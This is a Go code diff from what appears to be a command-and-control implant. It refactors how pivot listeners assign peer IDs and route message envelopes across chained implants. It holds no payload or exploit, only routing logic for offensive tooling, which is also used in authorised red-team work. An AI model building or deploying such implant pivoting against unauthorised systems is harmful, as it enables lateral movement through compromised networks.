@@ -51,15 +51,22 @@ var (
 	pivotListeners = &sync.Map{}
 	listenerID     = uint32(0)
 
-	// PeerID - This implant's Peer ID, a per-execution instance ID
-	PeerID = generatePeerID()
+	// MyPeerID - This implant's Peer ID, a per-execution instance ID
+	MyPeerID = generatePeerID()
 )
 
 // generatePeerID - Generate a new pivot id
 func generatePeerID() int64 {
 	buf := make([]byte, 8)
-	rand.Read(buf)
-	return int64(binary.LittleEndian.Uint64(buf))
+	_, err := rand.Read(buf)
+	if err != nil {
+		return time.Now().UnixNano() // These need only be unique
+	}
+	peerID := int64(binary.LittleEndian.Uint64(buf))
+	if peerID == int64(0) {
+		return time.Now().UnixNano()
+	}
+	return peerID
 }
 
 // CreateListener - Generic interface to a start listener function
@@ -79,7 +86,7 @@ func GetListeners() []*pb.PivotListener {
 // AddListener - Add a listener
 func AddListener(listener *PivotListener) {
 	// {{if .Config.Debug}}
-	log.Printf("[pivot] my peer id: %d", PeerID)
+	log.Printf("[pivot] my peer id: %d", MyPeerID)
 	log.Printf("[pivot] adding listener: %s", listener.BindAddress)
 	// {{end}}
 	pivotListeners.Store(listener.ID, listener)
@@ -123,45 +130,35 @@ func StopListener(id uint32) {
 }
 
 // SendToPeer - Forward an envelope to a peer
-func SendToPeer(envelope *pb.Envelope) (bool, int64) {
-	myPeerEnvelope := &pb.PivotPeerEnvelope{}
-	err := proto.Unmarshal(envelope.Data, myPeerEnvelope)
+func SendToPeer(envelope *pb.Envelope) bool {
+	pivotPeerEnvelope := &pb.PivotPeerEnvelope{}
+	err := proto.Unmarshal(envelope.Data, pivotPeerEnvelope)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to unmarshal peer envelope: %s", err)
 		// {{end}}
-		return false, 0
+		return false
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("my peer envelope: %+v", myPeerEnvelope)
+	log.Printf("my peer envelope: %+v", pivotPeerEnvelope)
 	// {{end}}
 
-	nextPeerEnvelope := &pb.PivotPeerEnvelope{}
-	err = proto.Unmarshal(myPeerEnvelope.Data, nextPeerEnvelope)
+	nextPeerID, err := findNextPeerID(pivotPeerEnvelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Failed to unmarshal peer envelope: %s", err)
+		log.Printf("Failed to find next peer id: %s", err)
 		// {{end}}
-		return false, nextPeerEnvelope.PeerID
+		return false
 	}
 
-	// {{if .Config.Debug}}
-	log.Printf("Peer envelope next type: %v", nextPeerEnvelope.NextMsgType)
-	log.Printf("Send to downstream pivot id: %d", nextPeerEnvelope.PeerID)
-	// {{end}}
-
-	downstreamEnvelope := &pb.Envelope{
-		Type: nextPeerEnvelope.NextMsgType,
-		Data: nextPeerEnvelope.Data,
-	}
 	sent := false // Controls iteration of outer loop
 	pivotListeners.Range(func(key interface{}, value interface{}) bool {
 		listener := value.(*PivotListener)
-		pivotConn, ok := listener.PivotConnections.Load(nextPeerEnvelope.PeerID)
+		pivotConn, ok := listener.PivotConnections.Load(nextPeerID)
 		if ok {
 			pivot := pivotConn.(*NetConnPivot)
-			pivot.Downstream <- downstreamEnvelope
+			pivot.Downstream <- envelope
 			sent = true  // break from the outer loop
 			return false // stop iterating inner loop
 		}
@@ -169,11 +166,22 @@ func SendToPeer(envelope *pb.Envelope) (bool, int64) {
 	})
 	// {{if .Config.Debug}}
 	if !sent {
-		log.Printf("Failed to find peer with id %d", nextPeerEnvelope.PeerID)
-		return false, nextPeerEnvelope.PeerID
+		log.Printf("Failed to find peer with id %d", nextPeerID)
+		return false
 	}
 	// {{end}}
-	return sent, 0
+	return sent
+}
+
+func findNextPeerID(pivotPeerEnvelope *pb.PivotPeerEnvelope) (int64, error) {
+	for index, peer := range pivotPeerEnvelope.Peers {
+		if peer.PeerID == MyPeerID {
+			if 0 <= index-1 {
+				return pivotPeerEnvelope.Peers[index-1].PeerID, nil
+			}
+		}
+	}
+	return int64(0), errors.New("next peer not found")
 }
 
 // PivotListener - A pivot listener
@@ -309,21 +317,30 @@ func (p *NetConnPivot) Start(pivots *sync.Map) {
 					Type: pb.MsgPivotPeerPing,
 					Data: envelope.Data,
 				}
-			} else {
+			} else if envelope.Type == pb.MsgPivotPeerEnvelope {
 				// {{if .Config.Debug}}
 				log.Printf("[pivot] received peer envelope, upstreaming (%d) ...", envelope.Type)
 				// {{end}}
-				data, _ := proto.Marshal(&pb.PivotPeerEnvelope{
-					PeerID:      PeerID, // This proccess' Peer ID
-					Name:        consts.SliverName,
-					NextMsgType: envelope.Type,
-					Data:        envelope.Data,
-				})
-				p.upstream <- &pb.Envelope{
-					ID:   0, // Pivot server implementation uses handlers, so ID must be zero
-					Type: pb.MsgPivotPeerEnvelope,
-					Data: data,
+				peerEnvelope := &pb.PivotPeerEnvelope{}
+				err := proto.Unmarshal(envelope.Data, peerEnvelope)
+				if err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("[pivot] error un-marshalling peer envelope: %s", err)
+					// {{end}}
+					continue
 				}
+				// Append ourselves to the list of peers, and then upstream
+				peerEnvelope.Peers = append(peerEnvelope.Peers, &pb.PivotPeer{
+					PeerID: MyPeerID,
+					Name:   consts.SliverName,
+				})
+				envelope.Data, _ = proto.Marshal(peerEnvelope)
+				p.upstream <- envelope
+			} else {
+				// {{if .Config.Debug}}
+				log.Printf("[pivot] received unknown message type (%d), dropping ...", envelope.Type)
+				// {{end}}
+				continue
 			}
 		}
 	}()
